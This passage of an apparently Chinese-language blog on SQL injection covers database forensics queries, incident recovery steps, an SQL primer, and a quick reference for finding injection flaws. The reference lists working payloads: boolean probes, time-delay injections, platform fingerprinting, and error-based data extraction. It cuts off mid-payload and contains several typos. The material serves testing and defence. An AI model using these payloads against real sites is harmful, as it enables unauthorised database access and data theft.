<span class="token punctuation">(</span><span class="token keyword">select</span> name<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'Db_User'</span><span class="token punctuation">,</span> createdate<span class="token punctuation">,</span> updatedate <span class="token keyword">from</span> sys<span class="token punctuation">.</span>sysusers<span class="token punctuation">)</span> <span class="token keyword">UNION</span>
<span class="token punctuation">(</span><span class="token keyword">select</span> name<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'Login'</span><span class="token punctuation">,</span> createdate<span class="token punctuation">,</span> updatedate <span class="token keyword">from</span> sys<span class="token punctuation">.</span>syslogins<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h6 id="Oracle-8"><a href="#Oracle-8" class="headerlink" title="Oracle"></a>Oracle</h6><p>在Oracle中，可以使用下面的查询返回当前数据库中数据库对象类型的一个列表，比如表、视图和过程，并按照修改日期和创建日期以降序方式排序：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Select</span> object_name<span class="token punctuation">,</span> object_id<span class="token punctuation">,</span> object_type<span class="token punctuation">,</span> created<span class="token punctuation">,</span> last_DDL_time <span class="token keyword">from</span> dba_objects <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> LAST_DDL_time <span class="token keyword">DESC</span><span class="token punctuation">,</span> created <span class="token keyword">DESC</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h6 id="MySQL-3"><a href="#MySQL-3" class="headerlink" title="MySQL"></a>MySQL</h6><p>当使用MySQL数据库时，应该注意对于某些对象比如触发器和视图并不存储时间戳。运行下面的查询，没有时间戳的对象将返回NULL值作为时间戳列的值</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span>
<span class="token punctuation">(</span>
<span class="token punctuation">(</span><span class="token keyword">SELECT</span> TABLE_NAME <span class="token keyword">as</span> <span class="token string">"OBJECT"</span><span class="token punctuation">,</span> TABLE_SCHEMA <span class="token keyword">as</span> <span class="token string">"OBJECT_SCHEMA"</span><span class="token punctuation">,</span>
TABLE_TYPE <span class="token keyword">as</span> <span class="token string">"OBJECT_TYPE"</span><span class="token punctuation">,</span> CREATE_TIME<span class="token punctuation">,</span> UPDATE_TIME <span class="token keyword">from</span>
information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span>
<span class="token keyword">UNION</span> 
<span class="token punctuation">(</span><span class="token keyword">SELECT</span> SPECIFIC_NAME<span class="token punctuation">,</span> ROUTINE_SCHEMA<span class="token punctuation">,</span> ROUTINE_TYPEZ CREATED<span class="token punctuation">,</span> LAST_ALTERED <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>routines <span class="token keyword">WHERE</span> ROUTINE_TYPE <span class="token operator">=</span><span class="token string">'PROCEDURE'</span><span class="token punctuation">)</span>
<span class="token keyword">UNION</span>
<span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">User</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'DB_USER'</span><span class="token punctuation">,</span>	<span class="token string">''</span><span class="token punctuation">,</span>	<span class="token string">''</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h6 id="PostgreSQL-6"><a href="#PostgreSQL-6" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h6><p>对于创建的对象、表和用户等，PostgreSQL并不记录它们的时间戳信息。可以使用下面的查询，返回当前数据库中关键对象的名称、模式和类型。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> proname <span class="token keyword">as</span> <span class="token string">"OBJECT_NAME"</span><span class="token punctuation">,</span> <span class="token string">''</span> <span class="token keyword">as</span> <span class="token string">"OBJECT_SCHEMA"</span><span class="token punctuation">,</span><span class="token string">'PROCEDURE'</span> <span class="token keyword">as</span>
<span class="token string">"OBJECT_TYPE"</span> <span class="token keyword">from</span> pg_proc <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">select</span> tgname<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'TRIGGER'</span> <span class="token keyword">from</span> pg_trigger
<span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">select</span> tablename<span class="token punctuation">,</span> schemaname<span class="token punctuation">,</span> <span class="token string">'TABLE'</span> <span class="token keyword">from</span> pg_tables <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">select</span> usename<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'USER'</span> <span class="token keyword">from</span> pg_user  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="如果你是受害者，该怎么办？"><a href="#如果你是受害者，该怎么办？" class="headerlink" title="如果你是受害者，该怎么办？"></a>如果你是受害者，该怎么办？</h3><h4 id="遏制安全事件"><a href="#遏制安全事件" class="headerlink" title="遏制安全事件"></a>遏制安全事件</h4><p>要遏制SQL注入攻击事件，可以简单地拔除受损害服务器的网线。</p>
<h4 id="评估涉及的数据"><a href="#评估涉及的数据" class="headerlink" title="评估涉及的数据"></a>评估涉及的数据</h4><ul>
<li><p>涉及信息的类型。</p>
</li>
<li><p>涉及的信息是否可辨识为个人信息还是组织机构的信息。</p>
</li>
<li><p>影响到哪些国家、州或省的人。</p>
</li>
<li><p>对数据执行了什么操作（更新、删除、修改或泄漏）。</p>
</li>
<li><p>重用未授权数据的影响。</p>
</li>
<li><p>任何缓解措施，比如数据加密，这可以降低未经授权的人重用这些信息的可能性。</p>
</li>
</ul>
<h4 id="通知相关人员"><a href="#通知相关人员" class="headerlink" title="通知相关人员"></a>通知相关人员</h4><p>要求委托管理个人信息的组织机构在数据安全遭受破坏时通知受影响的人员。</p>
<h4 id="确定攻击者在系统上执行了哪些操作？"><a href="#确定攻击者在系统上执行了哪些操作？" class="headerlink" title="确定攻击者在系统上执行了哪些操作？"></a>确定攻击者在系统上执行了哪些操作？</h4><ul>
<li><p>标识出攻击者查看到的信息。</p>
</li>
<li><p>识别出攻击者执行的DML和DDL操作，以及受影响的特定记录。</p>
</li>
<li><p>标识出事务之前和事务之后受影响的数据状态，以支持恢复数据库。</p>
</li>
<li><p>恢复之前己经被删除的数据。</p>
</li>
</ul>
<p>数据库取证资源</p>
<table>
<thead>
<tr>
<th align="center">RDBMS</th>
<th>图   书</th>
<th>专注于信息取证的Web网站</th>
<th>工   具</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Microsoft  SQL  Server</td>
<td>SQL Server Forensic Analysis，Addison  Wesley Professional</td>
<td><a target="_blank" rel="noopener" href="http://www.applicationfdrensics.com/">www.applicationfdrensics.com</a></td>
<td>Windows Forensic Toolchest  (SQL)</td>
</tr>
<tr>
<td align="center">Oracle</td>
<td>Oracle Forensics，  Rampant  Press</td>
<td><a target="_blank" rel="noopener" href="http://www.red-databasesecurity.com/">www.red-databasesecurity.com</a>  <br><a target="_blank" rel="noopener" href="http://www.v3rity.com/">www.v3rity.com</a><br><a target="_blank" rel="noopener" href="http://www.applicationfbrensics.com/">www.applicationfbrensics.com</a></td>
<td>McAfee Security Scanner for  Databases</td>
</tr>
<tr>
<td align="center">MySQL</td>
<td>无</td>
<td><a target="_blank" rel="noopener" href="http://www.applicationfbrensics.com/">www.applicationfbrensics.com</a></td>
<td>无</td>
</tr>
<tr>
<td align="center">PostgreSQL</td>
<td>无</td>
<td><a target="_blank" rel="noopener" href="http://www.applicationfbrensics.com/">www.applicationfbrensics.com</a></td>
<td>无</td>
</tr>
</tbody></table>
<h4 id="从SQL注入攻击中恢复"><a href="#从SQL注入攻击中恢复" class="headerlink" title="从SQL注入攻击中恢复"></a>从SQL注入攻击中恢复</h4><p>静态有效载荷：从一个受损害系统到另外一个受损害系统，在后损害(post-compromise)系统上执行的活动是一致的。</p>
<p>动态有效载荷：从一个受损害系统到另外一个受损害系统，在后损害(post-compromise)系统上执行的活动是不一致的。</p>
<h5 id="确定攻击携带的有效载荷"><a href="#确定攻击携带的有效载荷" class="headerlink" title="确定攻击携带的有效载荷"></a>确定攻击携带的有效载荷</h5><p>执行下面的步骤，以识别成功SQL注入攻击的有效载荷：</p>
<ol>
<li><p>备份受损害数据库：为受损害数据库制作两份副本。一份用于恢复数据，另一份则作为干净的恢复点，以备在恢复出现问题时使用。</p>
</li>
<li><p>提取恶意的SQL注入查询，从受损害的Web服务器日志、数据库执行计划，包括从MySQL和PostgreSQL数据库服务器的statement log和binary logs中提取恶意查询和语句的唯一清单。</p>
</li>
<li><p>理解恶意查询的逻辑：检查列出的恶意查询和语句，确定它们所创建、访问、更新或删除的对象，以及攻击者如何实现这些操作。我们需要这些信息来确定安全事件影响的范围， 从而规划出恢复安全事件的步骤。</p>
</li>
<li><p>搜索恶意查询参考：我们可能己经具有己知恶意语句和命令的列表，可以使用该列表与之前提取的恶意查询清单相互比对，以识别恶意查询的来源。</p>
</li>
<li><p>确定恶意查询是静态有效载荷还是动态有效载荷的一部分：从搜索结果中可以确定， 攻击是与诸如SQL注入蠕虫这样的静态有效载荷有关，还是与攻击者使用SQL注入漏洞利用工具、投送传统即席查询(ad-hoc)的动态有效载荷有关。</p>
</li>
<li><p>查找多种漏洞：在恶意查询清单中检查所有的条目，因为同一 SQL注入漏洞可能会被多次利用，既可能使用静态有效载荷也可能通过动态有效载荷。</p>
</li>
</ol>
<h5 id="从携带静态有效载荷的攻击中恢复"><a href="#从携带静态有效载荷的攻击中恢复" class="headerlink" title="从携带静态有效载荷的攻击中恢复"></a>从携带静态有效载荷的攻击中恢复</h5><p>恢复的核心问题，是将数据库回滚到受攻击影响之前的状态，或者识别并取消 (undo)那些恶意查询和语句所执行的具体操作。</p>
<p>从携带静态有效载荷的攻击中进行恢复的步骤：</p>
<ol>
<li><p>恢复数据库状态</p>
<ul>
<li>从备份中恢复</li>
<li>标识要回滚的事务</li>
</ul>
</li>
<li><p>检验数据库服务器配置：如果静态有效载荷带有频繁针对RDBMS特性的攻击，或者解除服务器的安全配置以实现进一步的攻击，那么应该将数据库服务器的配置恢复到已知的良好状态。</p>
</li>
<li><p>识别并修复SQL注入漏洞：确保对整个代码库进行一次应用程序安全评估，以识别可被利用的漏洞和其他可能存在的情况。</p>
</li>
<li><p>在线恢复系统并恢复Web服务。</p>
</li>
</ol>
<h5 id="从携带动态有效载荷的攻击中恢复"><a href="#从携带动态有效载荷的攻击中恢复" class="headerlink" title="从携带动态有效载荷的攻击中恢复"></a>从携带动态有效载荷的攻击中恢复</h5><p>对于携带动态有效载荷的成功攻击，强烈建议聘请数据库取证专家进行调查取证。</p>
<p>可以遵循下列步骤：</p>
<ol>
<li><p>恢复数据库状态：对于动态有效载荷的SQL注入攻击，建议将RDBMS和操作系统都恢复到受损害之前的状态。</p>
</li>
<li><p>识别脱离数据库的活动：在之前收集好的恶意查询清单中，应该标识出那些允许攻击者脱离数据库服务器、进入底层操作系统的文件系统或注册表的语句。如果发现针对操作系统的活动，就应该执行下列操作：</p>
<ul>
<li>查找创建了带外通信的任何方法</li>
<li>查找对操作系统文件的引用，或者攻击者读取、创建或加载到数据库中的注册表键值 (key)。</li>
</ul>
</li>
<li><p>检验数据库服务器的配置：一旦攻击者获得对数据库服务器的访问之后，他就会解除存在的安全设置，以便进一步在服务器上实施攻击。</p>
</li>
<li><p>识别并修复SQL注入漏洞：确保对整个代码库进行一次应用程序安全评估，以识别可被利用的漏洞和其他可能存在的情况。</p>
</li>
<li><p>在线恢复系统并恢复Web服务。</p>
</li>
</ol>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><h3 id="SQL入门"><a href="#SQL入门" class="headerlink" title="SQL入门"></a>SQL入门</h3><h4 id="SQL查询"><a href="#SQL查询" class="headerlink" title="SQL查询"></a>SQL查询</h4><ol>
<li>SELEC丁语句</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> tblUsers
<span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> tblUsers
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> tblUsers <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">AND</span> password <span class="token operator">=</span> <span class="token string">'letmein'</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">INTO</span> hackerTable <span class="token keyword">FROM</span> tblUsers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="2">
<li>UNION运算符</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> tblUsers <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> tblAdmins
<span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> tblUsers <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> tblAdmins<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ol start="3">
<li>INSERT 语句</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> tblUsers <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">'john'</span><span class="token punctuation">,</span><span class="token string">'smith'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> tblUsers<span class="token punctuation">(</span>id<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> priv<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">,</span><span class="token string">'smith'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ol start="4">
<li>UPDATE 语句</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> tblUsers <span class="token keyword">SET</span> priv<span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'sarah'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="5">
<li>DELETE 语句</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DELETE</span> <span class="token keyword">FROM</span> tblUsers <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="6">
<li>DROP语句</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> tblUsers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="7">
<li>CREATE TABLE 语句</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> shoppinglist<span class="token punctuation">(</span>item <span class="token keyword">int</span><span class="token punctuation">,</span> name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> shoppinglist <span class="token keyword">as</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> dba_users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ol start="8">
<li>ALTER TABLE 语句</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> tblUsers <span class="token keyword">ADD</span> comments <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
<span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> tblUsers <span class="token keyword">DROP</span> <span class="token keyword">COLUMN</span> comments
<span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> tblUsers <span class="token keyword">ALTER</span> <span class="token keyword">COLUMN</span> comments <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ol start="9">
<li>GROUP BY语句</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> customer<span class="token punctuation">,</span> <span class="token function">SUM</span><span class="token punctuation">(</span>cost<span class="token punctuation">)</span> <span class="token keyword">FROM</span> orders <span class="token keyword">WHERE</span> customer <span class="token operator">=</span> <span class="token string">'Anthony Anteater'</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> customer<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="10">
<li>ORDER BY 子句</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> cost<span class="token punctuation">,</span>product <span class="token keyword">FROM</span> orders <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> <span class="token keyword">DESC</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="11">
<li>限制结果集</li>
</ol>
<h3 id="SQL注入快速参考"><a href="#SQL注入快速参考" class="headerlink" title="SQL注入快速参考"></a>SQL注入快速参考</h3><h4 id="识别SQL注入漏洞"><a href="#识别SQL注入漏洞" class="headerlink" title="识别SQL注入漏洞"></a>识别SQL注入漏洞</h4><p>发现SQL注入缺陷</p>
<table>
<thead>
<tr>
<th>方   法</th>
<th>描   述</th>
</tr>
</thead>
<tbody><tr>
<td>异常的输入是否会产生数据库 错误？</td>
<td>输入SQL元字符或异常、错误的数据类型，有可能产生数据库错误。常见的测试用例包括在字符串字段中输入单引号(‘)字符，或者在数值字段中输入随机的字符串。通常可以通过HTTP状态代码500，或者页面中描述性的错误消息来识别这种数据库错误。提交异常数据并分析服务器响应中的下列字符串，有助于识别SQL注入漏洞：<br><code>Microsoft OLE DB Provider  ORA-  PLS-  error in your SQL Syntax  80040E14  SQL Error  Incorrect Syntax near  SQLServer  Failed MySQL  Unclosed Quotation Mark  JDBC Driver  ODBC Driver  SQL  ODBC  </code></td>
</tr>
<tr>
<td>合法、正确的输入是否可以替换 等效的SQL表达式？</td>
<td>如果遇到了错误，修改输入的数据以分析错误，确定输入的数据是否导致了SQL语法错误。例如，双倍使用单引号字符——如果一个引号导致了错误，而两个引号没有产生错误，那么很有可能存在未发现的SQL注入缺陷。请注意，由错误数据类型导致的错误可以是预期的并具有正常的表现。 例如，如果在需要数值的地方提供了字符串数据，那么很多应用程序将 产生错误。这时应该进一步采用其他技术来确认是否存在SQL注入漏洞。 在采用这种检测技术之前，判断所测试的输入对于服务器的响应是否有影响是很重要的。例如，如果提供了一个数值，那么尝试使用另一个不同的数值并确定是否产生了可度量且一致的差异。对于字符串值， 使用同一字符集，并将字符串值修改为一个相同长度的随机字符串， 然后观察应用程序的响应。如果对数据的修改并没有对页面长度、内容或HTTP响应代码产生一致的差别，那么该技术不太可能成功。</td>
</tr>
<tr>
<td>合法、正确的输入是否可以替换 等效的SQL表达式？</td>
<td>数值数据在这个例子中，我们将假定测试一个传递给news.php脚本的数值类型的ID参数。下面两个请求产生了不同的响应，因此可以认为ID参数是动态的，并且可以用于这种测试方法。<br><a target="_blank" rel="noopener" href="http://target/news.php?ID=1">http://target/news.php?ID=1</a><br><a target="_blank" rel="noopener" href="http://target/news.php?ID=2">http://target/news.php?ID=2</a> <br>在测试过程中，下一个步骤是提交一个SQL表达式，该表达式将被计算为事先确定好的正确值（比如上面例子中的1和2）。然后将对每一个表达式的响应与初始测试时的响应进行比较，以确定是否对该表达式  进行了计算。在这种类型的测试中，常用的SQL函数是ASCII(),对于所提供的ASCII字符，该函数将返回一个整数。因此，下面的SQL表达式应该返回值1( “2”的ASCT编码值是50)<br>51-ASCII(2) <br>如果我们的输入被SQL Server以不安全的方式解析，那么下列请求应该等价于原始的请求：<br><a target="_blank" rel="noopener" href="http://target/news.php?ID=51-ASCII(2)">http://target/news.php?ID=51-ASCII(2)</a><br>– 等价手ID=1 <br><a target="_blank" rel="noopener" href="http://target/news.php?ID=52-ASCII(2)">http://target/news.php?ID=52-ASCII(2)</a><br>– 等价手ID=2 <br>绝大多数主流数据库平台都支持ASCII()函数，包括Microsoft SQL  Server、Oracle、MySQL 和 PostgreSQL。 请使用类似的算术表达式来确认结果。字符串数据 当处理字符串数据时，可以采用与评估数值参数类似的方法。与前面的例子一样，第一步是从应用程序获取有效的值，并确定当改变该值时服务器的响应也一致地产生差异。在本例中，我们假定下面的请求参数值将产生不同的结果：<br><a target="_blank" rel="noopener" href="http://target/products.asp?catagory=shoes">http://target/products.asp?catagory=shoes</a><br><a target="_blank" rel="noopener" href="http://target/products.asp?catagory=blahfoo">http://target/products.asp?catagory=blahfoo</a><br>在测试字符串数据时，一种常用的策略是将字符串拆分为两个或多个子串，然后再使用SQL语法在服务器端将这些子串连接起来。一个重要的附加说明是：对于字符串的连接，需要根据数据库平台的不同采用不同的连接语法。由于我们可能事先知道是哪一种数据库服务器， 因此典型的办法是一开始就使用目标平台的字符串连接语法，比如  Microsoft SQL Server、Oracle 或 MySQL。下列 URL 实现了再造参数值”shoes”的字符串连接： <br>Microsoft  SQL Server  <a target="_blank" rel="noopener" href="http://target/products.asp?catagory=sho%27+%27es(+%E6%98%AF+%E5%8F%B7%E7%9A%84URL%E7%BC%96%E7%A0%81)">http://target/products.asp?catagory=sho'%2b'es(%2b是+号的URL编码)</a><br>Oracle 或 PostgreSQL  <a target="_blank" rel="noopener" href="http://target/products.asp?catagory=sho%27%7C%7C%27es">http://target/products.asp?catagory=sho'||'es</a> <br>MySQL  <a target="_blank" rel="noopener" href="http://target/products.asp?catagory=sho%27%20%27es">http://target/products.asp?catagory=sho'%20'es</a>  (%20是空格字符的URL编码)改变连接操作符两侧的子串将使输入无效，并取回与其他任意随机字符串一致的结果。</td>
</tr>
<tr>
<td>在服务器的响应中，SQL条件表达式的附加部分是否产生一致 的差异性？</td>
<td>从统计角度讲，大多数SQL注入漏洞都发生在这样的情况下：当用户提供的数据被不安全地包含在操作数中，并被传递给WHERE子句时。 在下面的例子中，请注意URL和产生的SQL査询：  <br>URL: <a target="_blank" rel="noopener" href="http://targetserver/news.php?id=100">http://targetserver/news.php?id=100</a>  <br>SQL: SELECT * FROM news WHERE article_id=100 <br>在正常的操作下，上面这个例子将取回并显示article_id值等于100的新闻文章。但是，如果参数id容易受到SQL注入&amp;击，那么下面的请求将产生不同的结果：<br>URL 1: <a target="_blank" rel="noopener" href="http://targetserver/news.php?id=100">http://targetserver/news.php?id=100</a> and 1=1  URL 2: <a target="_blank" rel="noopener" href="http://targetserver/news.php?id=100">http://targetserver/news.php?id=100</a> and 1=2  <br>通过添加”and 1=1”，在页面上应该看不到改变，因为从逻辑上来讲，该表达式并未改变WHERE子句的输出： <br> SELECT * FROM news WHERE article_id=100 and 1=1 相反，添加”and 1=2”意味着WHERE子句并不匹配数据库中的任何记录：<br>SELECT * FROM news WHERE article_id=100 and 1=2 通过使用这种技术操纵服务器的响应，我们常常可以识别SQL注入漏洞的存在。在某些情况下，可能需要通过关闭圆括号或者打破引号界定的数据，以便使用这种技术。例如，可以使用下面一系列的表达式：  <br>‘AND  ‘a’=’a Vs    ‘AND ‘a’=’b’  AND  1=1-Vs     ‘AND 1=2–  ) AND 1=1– Vs    ) AND 1=1–  ‘) AND 1=1-Vs     ‘) AND 1=2–</td>
</tr>
<tr>
<td>是否有可能触发可度量的时间 延迟？</td>
<td>通过SQL注入触发可度量的时间延迟，既可以用来确认是否存在缺陷， 在绝大多数情况下也可以用来识别后台数据库。</td>
</tr>
</tbody></table>
<h4 id="识别数据库平台"><a href="#识别数据库平台" class="headerlink" title="识别数据库平台"></a>识别数据库平台</h4><ol>
<li>通过时间延迟推理识别数据库平台</li>
</ol>
<p>产生时间延迟</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>平台</td>
<td>时间延迟</td>
</tr>
<tr>
<td>Microsoft SQL Server</td>
<td><code>WAITFOR DELAY 0:0:10'  </code></td>
</tr>
<tr>
<td>Oracle</td>
<td><code>BEGIN DBMS LOCK.SLEEP(5);END;-- (仅PL/SQL注入)</code><br><code>SELECT UTL_INADDR.get_host_name('192.168.0.1') FROM dual </code><br><code>SELECT UTL_INADDR.get_host_address('foo.nowhere999.zom'）FROM dual </code><br>SELECT UTL_HTTP.REOUEST(‘<a target="_blank" rel="noopener" href="http://www.oracle.com/">http://www.oracle.com</a>‘) FROM dual</td>
</tr>
<tr>
<td>MySQL</td>
<td><code>BENCHMARK(1000000,MD5("HACK")) -- 低于5.0.12版本</code>  <code>SLEEP(10)-- 5.0.12 及更高版本</code></td>
</tr>
<tr>
<td>PostgreSQL</td>
<td><code>SELECT pg_sleep(10);-- 8.2 及更高版本</code> <br> <code>CREATE OR REPLACE FUNCTION  pg_sleep(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C'  STRICT;-- 在Linux上创建 pg_sleep 函数，要求 postgres/pgsql 级别的权限</code></td>
</tr>
</tbody></table>
<ol start="2">
<li>通过SQL方言推理识别数据库平台</li>
</ol>
<p>SQL方言差异</p>
<table>
<thead>
<tr>
<th>平   台</th>
<th>连接符</th>
<th>行注释</th>
<th>唯一的默认表、变量或函数</th>
<th>Int转char函数</th>
</tr>
</thead>
<tbody><tr>
<td>Microsoft SQL Server</td>
<td>‘A’+’B’</td>
<td>–</td>
<td><code>@@PACK_RECEIVED</code></td>
<td><code>char(0*41)</code></td>
</tr>
<tr>
<td>Oracle</td>
<td>‘A’||’B’ concat(‘A’,’B’)</td>
<td>–</td>
<td><code>BITAND(1,1)</code></td>
<td><code>chr(65)</code></td>
</tr>
<tr>
<td>MySQL</td>
<td>concat(‘A’,’B’)  ‘A’ ‘B’</td>
<td>#</td>
<td><code>CONNECTION_ID()</code></td>
<td><code>char(0x41)</code></td>
</tr>
<tr>
<td>Access</td>
<td>“A” &amp; “B”</td>
<td>N/A</td>
<td><code>msysobjects</code></td>
<td><code>chr(65)</code></td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>‘A’||’B’</td>
<td>–</td>
<td><code>getpgusemame()  </code></td>
<td><code> chr(65)</code></td>
</tr>
<tr>
<td>DB2</td>
<td>‘a’ concat ‘b’</td>
<td>–</td>
<td><code>sysibm.systables</code></td>
<td><code>chr(65)</code></td>
</tr>
</tbody></table>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#Microsoft SQL Server</span>
<span class="token string">'AND @@PACK_RECEIVED = @@PACK_RECEIVED -- 
'</span><span class="token comment">#MySQL</span>
<span class="token string">'AND CONNECTION_ID() = CONNECTION_ID()-- 
'</span><span class="token comment">#Oracle</span>
<span class="token string">'AND BITAND(1,1) = BITAND(1,1)-- 
'</span><span class="token comment">#PostgreSQL</span>
'<span class="token operator">AND</span> getpgusername<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> getpgusername<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过错误消息提取数据</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#Microsoft SQL Server</span>
<span class="token operator">AND</span> <span class="token number">1</span> <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span><span class="token punctuation">(</span>Aversion<span class="token punctuation">)</span> <span class="token comment">-- </span>
<span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span><span class="token keyword">CONVERT</span><span class="token punctuation">(</span><span class="token keyword">INT</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> @<span class="token variable">@VERSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- </span>
<span class="token comment">#MySQL</span>
<span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> VERSION<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span 